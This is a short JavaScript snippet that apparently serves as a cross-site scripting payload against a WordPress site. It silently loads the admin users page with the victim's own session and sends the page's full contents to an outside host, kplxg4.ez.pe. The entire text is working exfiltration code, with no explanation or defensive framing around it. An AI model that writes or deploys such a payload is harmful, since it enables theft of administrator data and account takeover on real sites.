var req = new XMLHttpRequest();

req.open("GET", "/v3/wp-admin/users.php", false);
req.send();
var res = req.responseText;

req.open("GET", "https://kplxg4.ez.pe?res"+res, false);
req.send();
